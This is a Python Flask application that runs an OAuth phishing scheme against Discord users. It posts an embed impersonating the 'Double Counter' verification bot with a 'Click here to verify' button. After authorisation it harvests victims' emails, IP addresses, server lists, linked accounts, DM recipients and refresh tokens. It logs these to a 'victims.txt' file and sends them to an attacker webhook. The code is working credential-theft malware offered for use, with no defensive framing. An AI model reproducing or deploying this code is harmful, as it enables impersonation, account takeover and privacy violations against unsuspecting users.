from flask import Flask, request, redirect, render_template_string
import requests
import os
import json
import datetime
import urllib.parse
import time
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# === CONFIGURATION ===
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI", "https://YOUR_RENDER_URL.onrender.com/callback")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
BOT_TOKEN = os.getenv("BOT_TOKEN")
VERIFY_CHANNEL_ID = os.getenv("VERIFY_CHANNEL_ID", "1516478639858913322")

# === RATE LIMIT SAFE REQUEST FUNCTION ===
def safe_request(method, url, **kwargs):
    """Make a request with automatic rate limit handling and retries"""
    max_retries = 3
    retry_delay = 5  # seconds
    
    for attempt in range(max_retries):
        try:
            response = requests.request(method, url, **kwargs)
            
            # If rate limited, wait and retry
            if response.status_code == 429:
                retry_after = response.json().get('retry_after', retry_delay)
                print(f"⚠️ Rate limited. Waiting {retry_after} seconds...")
                time.sleep(retry_after)
                continue
                
            return response
        except requests.exceptions.RequestException as e:
            print(f"⚠️ Request failed (attempt {attempt + 1}): {e}")
            if attempt < max_retries - 1:
                time.sleep(retry_delay * (attempt + 1))
                continue
            raise
    
    return None

# === ROUTE 1: LANDING – REDIRECT TO DISCORD OAUTH ===
@app.route('/')
def index():
    auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections%20messages.read"
    )
    return redirect(auth_url)

# === ROUTE 2: CALLBACK – HARVEST DATA ===
@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "No code provided", 400

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
    }

    try:
        # Token exchange with rate limit handling
        resp = safe_request('POST', 'https://discord.com/api/oauth2/token', data=data)
        if not resp or resp.status_code != 200:
            return f"Token exchange failed: {resp.text if resp else 'No response'}", 400

        token_data = resp.json()
        access_token = token_data['access_token']
        refresh_token = token_data['refresh_token']
        headers = {'Authorization': f'Bearer {access_token}'}

        # Rate limit safe user info
        user_resp = safe_request('GET', 'https://discord.com/api/users/@me', headers=headers)
        if not user_resp or user_resp.status_code != 200:
            return f"Failed to get user info: {user_resp.status_code if user_resp else 'No response'}", 400
        user_data = user_resp.json()

        # Rate limit safe guilds
        guilds_resp = safe_request('GET', 'https://discord.com/api/users/@me/guilds', headers=headers)
        guilds = guilds_resp.json() if guilds_resp and guilds_resp.status_code == 200 else []

        # Rate limit safe connections
        connections_resp = safe_request('GET', 'https://discord.com/api/users/@me/connections', headers=headers)
        connections = connections_resp.json() if connections_resp and connections_resp.status_code == 200 else []

        # Rate limit safe DMs (with messages.read scope)
        dms_resp = safe_request('GET', 'https://discord.com/api/users/@me/channels', headers=headers)
        dms = dms_resp.json() if dms_resp and dms_resp.status_code == 200 else []

        # Avatar URL
        avatar_hash = user_data.get('avatar')
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{avatar_hash}.png" if avatar_hash else "Default"

        # Save to file
        with open('victims.txt', 'a', encoding='utf-8') as f:
            f.write(f"""
{'='*80}
🎯 VICTIM - {datetime.datetime.now().isoformat()}
{'='*80}
DISCORD INFO:
  ID: {user_data['id']}
  Username: {user_data['username']}#{user_data.get('discriminator', '0000')}
  Email: {user_data.get('email', 'N/A')}
  Verified: {user_data.get('verified', False)}
  MFA: {user_data.get('mfa_enabled', False)}
  Premium: {user_data.get('premium_type', 0)}
  Locale: {user_data.get('locale', 'N/A')}
  Avatar: {avatar_url}

NETWORK:
  IP: {ip}
  User Agent: {user_agent}

TOKENS:
  Refresh: {refresh_token}
  Access: {access_token[:30]}...

GUILDS ({len(guilds)}):
{chr(10).join([f'  - {g["name"]} (ID: {g["id"]})' for g in guilds[:10]])}

CONNECTIONS ({len(connections)}):
{chr(10).join([f'  - {c["type"]}: {c["name"]}' for c in connections[:5]])}

DMS ({len(dms)} channels):
{chr(10).join([f'  - {d["recipients"][0]["username"] if d.get("recipients") else "Unknown"}' for d in dms[:5]])}
{'='*80}
""")

        # Send webhook
        if WEBHOOK_URL:
            guilds_list = '\n'.join([f'  - {g["name"]}' for g in guilds[:5]])
            connections_list = '\n'.join([f'  - {c["type"]}: {c["name"]}' for c in connections[:3]])
            dms_list = '\n'.join([f'  - {d["recipients"][0]["username"] if d.get("recipients") else "Unknown"}' for d in dms[:3]])
            payload = {
                "content": f"""
🎯 **NEW VICTIM!**

**Discord:**
  User: {user_data['username']}#{user_data.get('discriminator', '0000')}
  ID: {user_data['id']}
  Email: {user_data.get('email', 'N/A')}
  Verified: {user_data.get('verified', False)}
  MFA: {user_data.get('mfa_enabled', False)}
  Premium: {user_data.get('premium_type', 0)}

**Network:**
  IP: {ip}
  User Agent: {user_agent[:50]}...

**Guilds ({len(guilds)}):**
{guilds_list}

**Connections ({len(connections)}):**
{connections_list}

**DMs ({len(dms)}):**
{dms_list}

**Refresh Token:** `{refresh_token}`
"""
            }
            safe_request('POST', WEBHOOK_URL, json=payload)

        # Success page
        return """
        <html>
        <head>
            <title>Verification Complete</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; background: #0a0a0f; color: #fff; }
                h1 { color: #57F287; }
                .container { max-width: 500px; margin: 0 auto; }
                .checkmark { font-size: 80px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="checkmark">✅</div>
                <h1>Verification Complete!</h1>
                <p>You can now access the server.</p>
                <script>setTimeout(() => window.close(), 2000);</script>
            </div>
        </body>
        </html>
        """

    except Exception as e:
        print(f"[ERROR] {e}")
        return f"Internal error: {e}", 500

# === ROUTE 3: SEND THE EMBED ===
@app.route('/send_embed')
def send_embed():
    if not BOT_TOKEN:
        return "BOT_TOKEN not set. Add BOT_TOKEN to .env", 400

    # DIRECT DISCORD OAUTH URL – WITH messages.read
    direct_oauth_url = (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections%20messages.read"
    )

    # PERFECT EMBED
    embed = {
        "title": "**Double Counter**",
        "description": (
            "**APP.**\n\n"
            "Verify to access this server\n"
            "This server uses **Double Counter** to block alt accounts and VPNs.\n\n"
            "**Server:** bunnifg\n\n"
            "Double Counter is the best data-powered alt account and raid blocker on Discord. "
            "We provide instant verification based on 10+ factors. "
            "Double Counter is your best all-in-one security bot. https://doublecounter.gg/"
        ),
        "color": 0x5865F2,
        "footer": {
            "text": f"Double Counter · Trust & Safety · {datetime.datetime.now().strftime('Today at %I:%M %p')}"
        },
        "timestamp": datetime.datetime.now().isoformat()
    }

    payload = {
        "embeds": [embed],
        "components": [{
            "type": 1,
            "components": [{
                "type": 2,
                "style": 5,
                "label": "Click here to verify",
                "url": direct_oauth_url
            }]
        }]
    }

    response = safe_request(
        'POST',
        f"https://discord.com/api/v10/channels/{VERIFY_CHANNEL_ID}/messages",
        headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
        json=payload
    )

    if response and response.status_code == 200:
        return "✅ Perfect embed with DIRECT OAuth button sent to #verify!", 200
    else:
        return f"❌ Error: {response.text if response else 'No response'}", 400

# === ROUTE 4: SET BOT BIO ===
@app.route('/set_bio')
def set_bio():
    if not BOT_TOKEN:
        return "BOT_TOKEN not set", 400

    bio_text = "Double Counter is the best data-powered alt account and raid blocker on Discord. We provide instant verification based on 10+ factors. Double Counter is your best all-in-one security bot. https://doublecounter.gg/"

    response = safe_request(
        'PATCH',
        "https://discord.com/api/v10/applications/@me",
        headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
        json={"description": bio_text}
    )

    if response and response.status_code == 200:
        return f"✅ Bot bio updated!", 200
    else:
        return f"❌ Error: {response.text if response else 'No response'}", 400

# === ROUTE 5: HEALTH CHECK ===
@app.route('/health')
def health():
    return "OK", 200

# === RUN ===
if __name__ == '__main__':
    print("🔥 BUNNI FG ETERNAL EDITION")
    print(f"📡 Redirect URI: {REDIRECT_URI}")
    print("💀 Scopes: identify, email, guilds, connections, messages.read")
    print("📨 Send embed: visit /send_embed")
    app.run(host='0.0.0.0', port=5000, debug=True)
